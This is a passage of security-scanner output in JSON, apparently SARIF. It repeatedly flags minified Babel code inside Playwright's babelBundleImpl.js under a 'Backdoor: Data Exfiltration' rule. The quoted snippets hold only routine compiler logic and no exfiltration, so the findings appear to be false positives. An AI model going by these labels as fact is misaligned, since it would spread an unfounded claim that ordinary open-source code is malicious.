                      "text": "Property(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButComputedKey=function(t){t.skip(),t.node.computed&&t.context.maybeQueue(t.get(\"key\"))};function om(e){let{context:t,node:r}=e;if(r.computed&&t.maybeQueue(e.get(\"key\")),r.decorators)for(let n of e.get(\"decorators\"))t.maybeQueue(n)}var aY={FunctionParent(e){e.isArrowFunctionExpression()||(e.skip(),e.isMethod()&&om(e))},Property(e){e.isObjectProperty()||(e.skip(),om(e))}},oY=aY;Ri.default=oY});var pS=E(uu=>{\"use strict\";Object.defineProperty(uu,\"__esModule\",{value:!0});uu.default=void 0;var lY=no()",
                      "markdown": "`Property(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButComputedKey=function(t){t.skip(),t.node.computed&&t.context.maybeQueue(t.get(\"key\"))};function om(e){let{context:t,node:r}=e;if(r.computed&&t.maybeQueue(e.get(\"key\")),r.decorators)for(let n of e.get(\"decorators\"))t.maybeQueue(n)}var aY={FunctionParent(e){e.isArrowFunctionExpression()||(e.skip(),e.isMethod()&&om(e))},Property(e){e.isObjectProperty()||(e.skip(),om(e))}},oY=aY;Ri.default=oY});var pS=E(uu=>{\"use strict\";Object.defineProperty(uu,\"__esModule\",{value:!0});uu.default=void 0;var lY=no()`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 1728,
                  "endLine": 12,
                  "endColumn": 1733,
                  "snippet": {
                    "text": "var cs=E(Ri=>{\"use strict\";Object.defineProperty(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButComputedKey=function(t){t.skip(),t.node.computed&&t.context.maybeQueue(t.get(\"key\"))};function om(e){let{context:t,node:r}=e;if(r.computed&&t.maybeQueue(e.get(\"key\")),r.decorators)for(let n of e.get(\"decorators\"))t.maybeQueue(n)}var aY={FunctionParent(e){e.isArrowFunctionExpression()||(e.skip(),e.isMethod()&&om(e))},Property(e){e.isObjectProperty()||(e.skip(),om(e))}},oY=aY;Ri.default=oY});var pS=E(uu=>{\"use strict\";Object.defineProperty(uu,\"__esModule\",{",
                    "rendered": {
                      "text": "var cs=E(Ri=>{\"use strict\";Object.defineProperty(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButComputedKey=function(t){t.skip(),t.node.computed&&t.context.maybeQueue(t.get(\"key\"))};function om(e){let{context:t,node:r}=e;if(r.computed&&t.maybeQueue(e.get(\"key\")),r.decorators)for(let n of e.get(\"decorators\"))t.maybeQueue(n)}var aY={FunctionParent(e){e.isArrowFunctionExpression()||(e.skip(),e.isMethod()&&om(e))},Property(e){e.isObjectProperty()||(e.skip(),om(e))}},oY=aY;Ri.default=oY});var pS=E(uu=>{\"use strict\";Object.defineProperty(uu,\"__esModule\",{",
                      "markdown": "`var cs=E(Ri=>{\"use strict\";Object.defineProperty(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButComputedKey=function(t){t.skip(),t.node.computed&&t.context.maybeQueue(t.get(\"key\"))};function om(e){let{context:t,node:r}=e;if(r.computed&&t.maybeQueue(e.get(\"key\")),r.decorators)for(let n of e.get(\"decorators\"))t.maybeQueue(n)}var aY={FunctionParent(e){e.isArrowFunctionExpression()||(e.skip(),e.isMethod()&&om(e))},Property(e){e.isObjectProperty()||(e.skip(),om(e))}},oY=aY;Ri.default=oY});var pS=E(uu=>{\"use strict\";Object.defineProperty(uu,\"__esModule\",{`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 1646,
                  "endLine": 12,
                  "endColumn": 1651,
                  "snippet": {
                    "text": ">fS(im(i),im(i))),s=cS(null,n);return e.insertAfter(s),e.replaceWith(t.node),e}});var cs=E(Ri=>{\"use strict\";Object.defineProperty(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButComputedKey=function(t){t.skip(),t.node.computed&&t.context.maybeQueue(t.get(\"key\"))};function om(e){let{context:t,node:r}=e;if(r.computed&&t.maybeQueue(e.get(\"key\")),r.decorators)for(let n of e.get(\"decorators\"))t.maybeQueue(n)}var aY={FunctionParent(e){e.isArrowFunctionExpression()||(e.skip(),e.isMethod()&&om(e))},Property(e){e.isObjectProperty()||(e.skip(),om(e))}},oY=aY;",
                    "rendered": {
                      "text": ">fS(im(i),im(i))),s=cS(null,n);return e.insertAfter(s),e.replaceWith(t.node),e}});var cs=E(Ri=>{\"use strict\";Object.defineProperty(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButComputedKey=function(t){t.skip(),t.node.computed&&t.context.maybeQueue(t.get(\"key\"))};function om(e){let{context:t,node:r}=e;if(r.computed&&t.maybeQueue(e.get(\"key\")),r.decorators)for(let n of e.get(\"decorators\"))t.maybeQueue(n)}var aY={FunctionParent(e){e.isArrowFunctionExpression()||(e.skip(),e.isMethod()&&om(e))},Property(e){e.isObjectProperty()||(e.skip(),om(e))}},oY=aY;",
                      "markdown": "`>fS(im(i),im(i))),s=cS(null,n);return e.insertAfter(s),e.replaceWith(t.node),e}});var cs=E(Ri=>{\"use strict\";Object.defineProperty(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButComputedKey=function(t){t.skip(),t.node.computed&&t.context.maybeQueue(t.get(\"key\"))};function om(e){let{context:t,node:r}=e;if(r.computed&&t.maybeQueue(e.get(\"key\")),r.decorators)for(let n of e.get(\"decorators\"))t.maybeQueue(n)}var aY={FunctionParent(e){e.isArrowFunctionExpression()||(e.skip(),e.isMethod()&&om(e))},Property(e){e.isObjectProperty()||(e.skip(),om(e))}},oY=aY;`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 1270,
                  "endLine": 12,
                  "endColumn": 1275,
                  "snippet": {
                    "text": "ult\"),(a||o)&&(i.node.id=sm(u)));let f=a?i.node:nY(\"var\",[sY(sm(u),i.node)]),p=cS(null,[fS(sm(u),im(\"default\"))]);return e.insertAfter(p),e.replaceWith(f),c&&l.registerDeclaration(e),e}else if(e.get(\"specifiers\").length>0)throw new Error(\"It doesn't make sense to split exported specifiers.\");let t=e.get(\"declaration\"),r=t.getOuterBindingIdentifiers(),n=Object.keys(r).map(i=>fS(im(i),im(i))),s=cS(null,n);return e.insertAfter(s),e.replaceWith(t.node),e}});var cs=E(Ri=>{\"use strict\";Object.defineProperty(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButC",
                    "rendered": {
                      "text": "ult\"),(a||o)&&(i.node.id=sm(u)));let f=a?i.node:nY(\"var\",[sY(sm(u),i.node)]),p=cS(null,[fS(sm(u),im(\"default\"))]);return e.insertAfter(p),e.replaceWith(f),c&&l.registerDeclaration(e),e}else if(e.get(\"specifiers\").length>0)throw new Error(\"It doesn't make sense to split exported specifiers.\");let t=e.get(\"declaration\"),r=t.getOuterBindingIdentifiers(),n=Object.keys(r).map(i=>fS(im(i),im(i))),s=cS(null,n);return e.insertAfter(s),e.replaceWith(t.node),e}});var cs=E(Ri=>{\"use strict\";Object.defineProperty(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButC",
                      "markdown": "`ult\"),(a||o)&&(i.node.id=sm(u)));let f=a?i.node:nY(\"var\",[sY(sm(u),i.node)]),p=cS(null,[fS(sm(u),im(\"default\"))]);return e.insertAfter(p),e.replaceWith(f),c&&l.registerDeclaration(e),e}else if(e.get(\"specifiers\").length>0)throw new Error(\"It doesn't make sense to split exported specifiers.\");let t=e.get(\"declaration\"),r=t.getOuterBindingIdentifiers(),n=Object.keys(r).map(i=>fS(im(i),im(i))),s=cS(null,n);return e.insertAfter(s),e.replaceWith(t.node),e}});var cs=E(Ri=>{\"use strict\";Object.defineProperty(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButC`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 1164,
                  "endLine": 12,
                  "endColumn": 1169,
                  "snippet": {
                    "text": ";u?o&&l.hasBinding(u.name)&&(c=!0,u=l.generateUidIdentifier(u.name)):(c=!0,u=l.generateUidIdentifier(\"default\"),(a||o)&&(i.node.id=sm(u)));let f=a?i.node:nY(\"var\",[sY(sm(u),i.node)]),p=cS(null,[fS(sm(u),im(\"default\"))]);return e.insertAfter(p),e.replaceWith(f),c&&l.registerDeclaration(e),e}else if(e.get(\"specifiers\").length>0)throw new Error(\"It doesn't make sense to split exported specifiers.\");let t=e.get(\"declaration\"),r=t.getOuterBindingIdentifiers(),n=Object.keys(r).map(i=>fS(im(i),im(i))),s=cS(null,n);return e.insertAfter(s),e.replaceWith(t.node),e}});var cs=E(Ri=>{\"use strict\";Object.defineP",
                    "rendered": {
                      "text": ";u?o&&l.hasBinding(u.name)&&(c=!0,u=l.generateUidIdentifier(u.name)):(c=!0,u=l.generateUidIdentifier(\"default\"),(a||o)&&(i.node.id=sm(u)));let f=a?i.node:nY(\"var\",[sY(sm(u),i.node)]),p=cS(null,[fS(sm(u),im(\"default\"))]);return e.insertAfter(p),e.replaceWith(f),c&&l.registerDeclaration(e),e}else if(e.get(\"specifiers\").length>0)throw new Error(\"It doesn't make sense to split exported specifiers.\");let t=e.get(\"declaration\"),r=t.getOuterBindingIdentifiers(),n=Object.keys(r).map(i=>fS(im(i),im(i))),s=cS(null,n);return e.insertAfter(s),e.replaceWith(t.node),e}});var cs=E(Ri=>{\"use strict\";Object.defineP",
                      "markdown": "`;u?o&&l.hasBinding(u.name)&&(c=!0,u=l.generateUidIdentifier(u.name)):(c=!0,u=l.generateUidIdentifier(\"default\"),(a||o)&&(i.node.id=sm(u)));let f=a?i.node:nY(\"var\",[sY(sm(u),i.node)]),p=cS(null,[fS(sm(u),im(\"default\"))]);return e.insertAfter(p),e.replaceWith(f),c&&l.registerDeclaration(e),e}else if(e.get(\"specifiers\").length>0)throw new Error(\"It doesn't make sense to split exported specifiers.\");let t=e.get(\"declaration\"),r=t.getOuterBindingIdentifiers(),n=Object.keys(r).map(i=>fS(im(i),im(i))),s=cS(null,n);return e.insertAfter(s),e.replaceWith(t.node),e}});var cs=E(Ri=>{\"use strict\";Object.defineP`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 689,
                  "endLine": 12,
                  "endColumn": 694,
                  "snippet": {
                    "text": "sm,exportNamedDeclaration:cS,exportSpecifier:fS,identifier:im,variableDeclaration:nY,variableDeclarator:sY}=rY;function iY(e){if(!e.isExportDeclaration()||e.isExportAllDeclaration())throw new Error(\"Only default and named export declarations can be split.\");if(e.isExportDefaultDeclaration()){let i=e.get(\"declaration\"),a=i.isFunctionDeclaration()||i.isClassDeclaration(),o=i.isFunctionExpression()||i.isClassExpression(),l=i.isScope()?i.scope.parent:i.scope,u=i.node.id,c=!1;u?o&&l.hasBinding(u.name)&&(c=!0,u=l.generateUidIdentifier(u.name)):(c=!0,u=l.generateUidIdentifier(\"default\"),(a||o)&&(i.node.id",
                    "rendered": {
                      "text": "sm,exportNamedDeclaration:cS,exportSpecifier:fS,identifier:im,variableDeclaration:nY,variableDeclarator:sY}=rY;function iY(e){if(!e.isExportDeclaration()||e.isExportAllDeclaration())throw new Error(\"Only default and named export declarations can be split.\");if(e.isExportDefaultDeclaration()){let i=e.get(\"declaration\"),a=i.isFunctionDeclaration()||i.isClassDeclaration(),o=i.isFunctionExpression()||i.isClassExpression(),l=i.isScope()?i.scope.parent:i.scope,u=i.node.id,c=!1;u?o&&l.hasBinding(u.name)&&(c=!0,u=l.generateUidIdentifier(u.name)):(c=!0,u=l.generateUidIdentifier(\"default\"),(a||o)&&(i.node.id",
                      "markdown": "`sm,exportNamedDeclaration:cS,exportSpecifier:fS,identifier:im,variableDeclaration:nY,variableDeclarator:sY}=rY;function iY(e){if(!e.isExportDeclaration()||e.isExportAllDeclaration())throw new Error(\"Only default and named export declarations can be split.\");if(e.isExportDefaultDeclaration()){let i=e.get(\"declaration\"),a=i.isFunctionDeclaration()||i.isClassDeclaration(),o=i.isFunctionExpression()||i.isClassExpression(),l=i.isScope()?i.scope.parent:i.scope,u=i.node.id,c=!1;u?o&&l.hasBinding(u.name)&&(c=!0,u=l.generateUidIdentifier(u.name)):(c=!0,u=l.generateUidIdentifier(\"default\"),(a||o)&&(i.node.id`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 156348,
                  "endLine": 8,
                  "endColumn": 156353,
                  "snippet": {
                    "text": "nction ZT(){Cr.path=su=new WeakMap}function eS(){Cr.scope=IH=new WeakMap}var Zh=Object.freeze({});function _H(e,t){var r,n;return e=null,(r=su.get((n=e)!=null?n:Zh))==null?void 0:r.get(t)}function NH(e,t){var r,n;e=null;let s=su.get((r=e)!=null?r:Zh);s||su.set((n=e)!=null?n:Zh,s=new WeakMap);let i=s.get(t);return i||s.set(t,i=new Map),i}});var rS=E((dCe,tS)=>{var Fi=1e3,ji=Fi*60,Li=ji*60,Js=Li*24,kH=Js*7,BH=Js*365.25;tS.exports=function(e,t){t=t||{};var r=typeof e;if(r===\"string\"&&e.length>0)return FH(e);if(r===\"number\"&&isFinite(e))return t.long?LH(e):jH(e);throw new Error(\"val is not a non-empty ",
                    "rendered": {
                      "text": "nction ZT(){Cr.path=su=new WeakMap}function eS(){Cr.scope=IH=new WeakMap}var Zh=Object.freeze({});function _H(e,t){var r,n;return e=null,(r=su.get((n=e)!=null?n:Zh))==null?void 0:r.get(t)}function NH(e,t){var r,n;e=null;let s=su.get((r=e)!=null?r:Zh);s||su.set((n=e)!=null?n:Zh,s=new WeakMap);let i=s.get(t);return i||s.set(t,i=new Map),i}});var rS=E((dCe,tS)=>{var Fi=1e3,ji=Fi*60,Li=ji*60,Js=Li*24,kH=Js*7,BH=Js*365.25;tS.exports=function(e,t){t=t||{};var r=typeof e;if(r===\"string\"&&e.length>0)return FH(e);if(r===\"number\"&&isFinite(e))return t.long?LH(e):jH(e);throw new Error(\"val is not a non-empty ",
                      "markdown": "`nction ZT(){Cr.path=su=new WeakMap}function eS(){Cr.scope=IH=new WeakMap}var Zh=Object.freeze({});function _H(e,t){var r,n;return e=null,(r=su.get((n=e)!=null?n:Zh))==null?void 0:r.get(t)}function NH(e,t){var r,n;e=null;let s=su.get((r=e)!=null?r:Zh);s||su.set((n=e)!=null?n:Zh,s=new WeakMap);let i=s.get(t);return i||s.set(t,i=new Map),i}});var rS=E((dCe,tS)=>{var Fi=1e3,ji=Fi*60,Li=ji*60,Js=Li*24,kH=Js*7,BH=Js*365.25;tS.exports=function(e,t){t=t||{};var r=typeof e;if(r===\"string\"&&e.length>0)return FH(e);if(r===\"number\"&&isFinite(e))return t.long?LH(e):jH(e);throw new Error(\"val is not a non-empty `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 156276,
                  "endLine": 8,
                  "endColumn": 156281,
                  "snippet": {
                    "text": "u=Cr.path=new WeakMap,IH=Cr.scope=new WeakMap;function OH(){ZT(),eS()}function ZT(){Cr.path=su=new WeakMap}function eS(){Cr.scope=IH=new WeakMap}var Zh=Object.freeze({});function _H(e,t){var r,n;return e=null,(r=su.get((n=e)!=null?n:Zh))==null?void 0:r.get(t)}function NH(e,t){var r,n;e=null;let s=su.get((r=e)!=null?r:Zh);s||su.set((n=e)!=null?n:Zh,s=new WeakMap);let i=s.get(t);return i||s.set(t,i=new Map),i}});var rS=E((dCe,tS)=>{var Fi=1e3,ji=Fi*60,Li=ji*60,Js=Li*24,kH=Js*7,BH=Js*365.25;tS.exports=function(e,t){t=t||{};var r=typeof e;if(r===\"string\"&&e.length>0)return FH(e);if(r===\"number\"&&isFini",
                    "rendered": {
                      "text": "u=Cr.path=new WeakMap,IH=Cr.scope=new WeakMap;function OH(){ZT(),eS()}function ZT(){Cr.path=su=new WeakMap}function eS(){Cr.scope=IH=new WeakMap}var Zh=Object.freeze({});function _H(e,t){var r,n;return e=null,(r=su.get((n=e)!=null?n:Zh))==null?void 0:r.get(t)}function NH(e,t){var r,n;e=null;let s=su.get((r=e)!=null?r:Zh);s||su.set((n=e)!=null?n:Zh,s=new WeakMap);let i=s.get(t);return i||s.set(t,i=new Map),i}});var rS=E((dCe,tS)=>{var Fi=1e3,ji=Fi*60,Li=ji*60,Js=Li*24,kH=Js*7,BH=Js*365.25;tS.exports=function(e,t){t=t||{};var r=typeof e;if(r===\"string\"&&e.length>0)return FH(e);if(r===\"number\"&&isFini",
                      "markdown": "`u=Cr.path=new WeakMap,IH=Cr.scope=new WeakMap;function OH(){ZT(),eS()}function ZT(){Cr.path=su=new WeakMap}function eS(){Cr.scope=IH=new WeakMap}var Zh=Object.freeze({});function _H(e,t){var r,n;return e=null,(r=su.get((n=e)!=null?n:Zh))==null?void 0:r.get(t)}function NH(e,t){var r,n;e=null;let s=su.get((r=e)!=null?r:Zh);s||su.set((n=e)!=null?n:Zh,s=new WeakMap);let i=s.get(t);return i||s.set(t,i=new Map),i}});var rS=E((dCe,tS)=>{var Fi=1e3,ji=Fi*60,Li=ji*60,Js=Li*24,kH=Js*7,BH=Js*365.25;tS.exports=function(e,t){t=t||{};var r=typeof e;if(r===\"string\"&&e.length>0)return FH(e);if(r===\"number\"&&isFini`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 156228,
                  "endLine": 8,
                  "endColumn": 156233,
                  "snippet": {
                    "text": "eateCachedPaths=NH;Cr.scope=Cr.path=void 0;var su=Cr.path=new WeakMap,IH=Cr.scope=new WeakMap;function OH(){ZT(),eS()}function ZT(){Cr.path=su=new WeakMap}function eS(){Cr.scope=IH=new WeakMap}var Zh=Object.freeze({});function _H(e,t){var r,n;return e=null,(r=su.get((n=e)!=null?n:Zh))==null?void 0:r.get(t)}function NH(e,t){var r,n;e=null;let s=su.get((r=e)!=null?r:Zh);s||su.set((n=e)!=null?n:Zh,s=new WeakMap);let i=s.get(t);return i||s.set(t,i=new Map),i}});var rS=E((dCe,tS)=>{var Fi=1e3,ji=Fi*60,Li=ji*60,Js=Li*24,kH=Js*7,BH=Js*365.25;tS.exports=function(e,t){t=t||{};var r=typeof e;if(r===\"string\"&",
                    "rendered": {
                      "text": "eateCachedPaths=NH;Cr.scope=Cr.path=void 0;var su=Cr.path=new WeakMap,IH=Cr.scope=new WeakMap;function OH(){ZT(),eS()}function ZT(){Cr.path=su=new WeakMap}function eS(){Cr.scope=IH=new WeakMap}var Zh=Object.freeze({});function _H(e,t){var r,n;return e=null,(r=su.get((n=e)!=null?n:Zh))==null?void 0:r.get(t)}function NH(e,t){var r,n;e=null;let s=su.get((r=e)!=null?r:Zh);s||su.set((n=e)!=null?n:Zh,s=new WeakMap);let i=s.get(t);return i||s.set(t,i=new Map),i}});var rS=E((dCe,tS)=>{var Fi=1e3,ji=Fi*60,Li=ji*60,Js=Li*24,kH=Js*7,BH=Js*365.25;tS.exports=function(e,t){t=t||{};var r=typeof e;if(r===\"string\"&",
                      "markdown": "`eateCachedPaths=NH;Cr.scope=Cr.path=void 0;var su=Cr.path=new WeakMap,IH=Cr.scope=new WeakMap;function OH(){ZT(),eS()}function ZT(){Cr.path=su=new WeakMap}function eS(){Cr.scope=IH=new WeakMap}var Zh=Object.freeze({});function _H(e,t){var r,n;return e=null,(r=su.get((n=e)!=null?n:Zh))==null?void 0:r.get(t)}function NH(e,t){var r,n;e=null;let s=su.get((r=e)!=null?r:Zh);s||su.set((n=e)!=null?n:Zh,s=new WeakMap);let i=s.get(t);return i||s.set(t,i=new Map),i}});var rS=E((dCe,tS)=>{var Fi=1e3,ji=Fi*60,Li=ji*60,Js=Li*24,kH=Js*7,BH=Js*365.25;tS.exports=function(e,t){t=t||{};var r=typeof e;if(r===\"string\"&`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 156190,
                  "endLine": 8,
                  "endColumn": 156195,
                  "snippet": {
                    "text": "ope=eS;Cr.getCachedPaths=_H;Cr.getOrCreateCachedPaths=NH;Cr.scope=Cr.path=void 0;var su=Cr.path=new WeakMap,IH=Cr.scope=new WeakMap;function OH(){ZT(),eS()}function ZT(){Cr.path=su=new WeakMap}function eS(){Cr.scope=IH=new WeakMap}var Zh=Object.freeze({});function _H(e,t){var r,n;return e=null,(r=su.get((n=e)!=null?n:Zh))==null?void 0:r.get(t)}function NH(e,t){var r,n;e=null;let s=su.get((r=e)!=null?r:Zh);s||su.set((n=e)!=null?n:Zh,s=new WeakMap);let i=s.get(t);return i||s.set(t,i=new Map),i}});var rS=E((dCe,tS)=>{var Fi=1e3,ji=Fi*60,Li=ji*60,Js=Li*24,kH=Js*7,BH=Js*365.25;tS.exports=function(e,t){t",
                    "rendered": {
                      "text": "ope=eS;Cr.getCachedPaths=_H;Cr.getOrCreateCachedPaths=NH;Cr.scope=Cr.path=void 0;var su=Cr.path=new WeakMap,IH=Cr.scope=new WeakMap;function OH(){ZT(),eS()}function ZT(){Cr.path=su=new WeakMap}function eS(){Cr.scope=IH=new WeakMap}var Zh=Object.freeze({});function _H(e,t){var r,n;return e=null,(r=su.get((n=e)!=null?n:Zh))==null?void 0:r.get(t)}function NH(e,t){var r,n;e=null;let s=su.get((r=e)!=null?r:Zh);s||su.set((n=e)!=null?n:Zh,s=new WeakMap);let i=s.get(t);return i||s.set(t,i=new Map),i}});var rS=E((dCe,tS)=>{var Fi=1e3,ji=Fi*60,Li=ji*60,Js=Li*24,kH=Js*7,BH=Js*365.25;tS.exports=function(e,t){t",
                      "markdown": "`ope=eS;Cr.getCachedPaths=_H;Cr.getOrCreateCachedPaths=NH;Cr.scope=Cr.path=void 0;var su=Cr.path=new WeakMap,IH=Cr.scope=new WeakMap;function OH(){ZT(),eS()}function ZT(){Cr.path=su=new WeakMap}function eS(){Cr.scope=IH=new WeakMap}var Zh=Object.freeze({});function _H(e,t){var r,n;return e=null,(r=su.get((n=e)!=null?n:Zh))==null?void 0:r.get(t)}function NH(e,t){var r,n;e=null;let s=su.get((r=e)!=null?r:Zh);s||su.set((n=e)!=null?n:Zh,s=new WeakMap);let i=s.get(t);return i||s.set(t,i=new Map),i}});var rS=E((dCe,tS)=>{var Fi=1e3,ji=Fi*60,Li=ji*60,Js=Li*24,kH=Js*7,BH=Js*365.25;tS.exports=function(e,t){t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 121632,
                  "endLine": 8,
                  "endColumn": 121637,
                  "snippet": {
                    "text": ")&&(i.leadingComments=Yl(e.leadingComments,t,r,n)),Dn(e,\"innerComments\")&&(i.innerComments=Yl(e.innerComments,t,r,n)),Dn(e,\"trailingComments\")&&(i.trailingComments=Yl(e.trailingComments,t,r,n)),Dn(e,\"extra\")&&(i.extra=Object.assign({},e.extra)),i}function Yl(e,t,r,n){return!e||!t?e:e.map(s=>{let i=n.get(s);if(i)return i;let{type:a,value:o,loc:l}=s,u={type:a,value:o,loc:l};return r&&(u.loc=null),n.set(s,u),u})}});var nT=E(Ud=>{\"use strict\";Object.defineProperty(Ud,\"__esModule\",{value:!0});Ud.default=oW;var aW=ls();function oW(e){return(0,aW.default)(e,!1)}});var sT=E(Vd=>{\"use strict\";Object.defineP",
                    "rendered": {
                      "text": ")&&(i.leadingComments=Yl(e.leadingComments,t,r,n)),Dn(e,\"innerComments\")&&(i.innerComments=Yl(e.innerComments,t,r,n)),Dn(e,\"trailingComments\")&&(i.trailingComments=Yl(e.trailingComments,t,r,n)),Dn(e,\"extra\")&&(i.extra=Object.assign({},e.extra)),i}function Yl(e,t,r,n){return!e||!t?e:e.map(s=>{let i=n.get(s);if(i)return i;let{type:a,value:o,loc:l}=s,u={type:a,value:o,loc:l};return r&&(u.loc=null),n.set(s,u),u})}});var nT=E(Ud=>{\"use strict\";Object.defineProperty(Ud,\"__esModule\",{value:!0});Ud.default=oW;var aW=ls();function oW(e){return(0,aW.default)(e,!1)}});var sT=E(Vd=>{\"use strict\";Object.defineP",
                      "markdown": "`)&&(i.leadingComments=Yl(e.leadingComments,t,r,n)),Dn(e,\"innerComments\")&&(i.innerComments=Yl(e.innerComments,t,r,n)),Dn(e,\"trailingComments\")&&(i.trailingComments=Yl(e.trailingComments,t,r,n)),Dn(e,\"extra\")&&(i.extra=Object.assign({},e.extra)),i}function Yl(e,t,r,n){return!e||!t?e:e.map(s=>{let i=n.get(s);if(i)return i;let{type:a,value:o,loc:l}=s,u={type:a,value:o,loc:l};return r&&(u.loc=null),n.set(s,u),u})}});var nT=E(Ud=>{\"use strict\";Object.defineProperty(Ud,\"__esModule\",{value:!0});Ud.default=oW;var aW=ls();function oW(e){return(0,aW.default)(e,!1)}});var sT=E(Vd=>{\"use strict\";Object.defineP`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
